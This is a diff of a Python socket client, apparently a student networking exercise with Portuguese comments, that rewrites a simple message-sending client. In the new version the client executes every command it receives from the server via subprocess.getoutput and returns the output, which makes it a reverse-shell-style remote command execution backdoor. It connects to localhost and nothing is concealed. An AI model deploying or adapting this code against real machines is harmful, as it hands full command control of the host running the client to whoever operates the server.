@@ -1,46 +1,53 @@
 import socket
+import threading
+import os
+import subprocess
 
-# Configurações para conectar ao seu servidor
-TCP_IP = '127.0.0.1' 
-TCP_PORTA = 10352      
-TAMANHO_BUFFER = 1024
+SERVER_IP = '127.0.0.1'
+SERVER_PORT = 10352
 
-# 1. Criação do socket
-cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((SERVER_IP, SERVER_PORT))
 
-try:
-    # 2. Conecta ao servidor APENAS UMA VEZ antes do loop 
-    cliente.connect((TCP_IP, TCP_PORTA))
-    print(f"[*] Conectado com sucesso ao servidor {TCP_IP}:{TCP_PORTA}")
+print("[*] Conectado ao servidor")
 
+def execute_command(command):
+    try:
+        if command.lower() == "exit":
+            return "Encerrando cliente."
+
+        # Executa comando no sistema
+        output = subprocess.getoutput(command)
+        return output if output else "Comando executado."
+
+    except Exception as e:
+        return f"Erro: {str(e)}"
+
+def receive_commands():
     while True:
-        # 3. Solicita a mensagem dentro do loop para enviar várias vezes [cite: 17]
-        mensagem = input("\nDigite o comando (ou /quit para sair): ")
+        try:
+            command = client.recv(4096).decode()
 
-        if not mensagem:
-            continue
+            if not command:
+                break
 
-        # 4. Envia a mensagem para o servidor
-        cliente.send(mensagem.encode('UTF-8'))
+            print(f"\n[COMANDO RECEBIDO]: {command}")
 
-        # Condição de saída baseada no protocolo do seu servidor [cite: 17]
-        if mensagem.lower() == '/quit':
+            result = execute_command(command)
+
+            client.send(result.encode())
+
+        except:
             break
 
-        # 5. Recebe a resposta do servidor [cite: 11]
-        data = cliente.recv(TAMANHO_BUFFER)
-        
-        if not data:
-            print("[!] Conexão perdida com o servidor.")
+def send_manual():
+    # opcional: permite enviar algo manualmente
+    while True:
+        msg = input()
+        if msg.lower() == "/quit":
+            client.close()
             break
+        client.send(msg.encode())
 
-        print(f"[RESPOSTA]: {data.decode('UTF-8')}")
-
-except ConnectionRefusedError:
-    print("[ERRO] Não foi possível conectar. O servidor está rodando?") [cite: 13]
-except Exception as e:
-    print(f"[ERRO] Ocorreu uma falha: {e}")
-finally:
-    # 6. Fecha a conexão de forma limpa ao sair
-    cliente.close()
-    print("[*] Conexão encerrada.")
+threading.Thread(target=receive_commands).start()
+threading.Thread(target=send_manual).start()
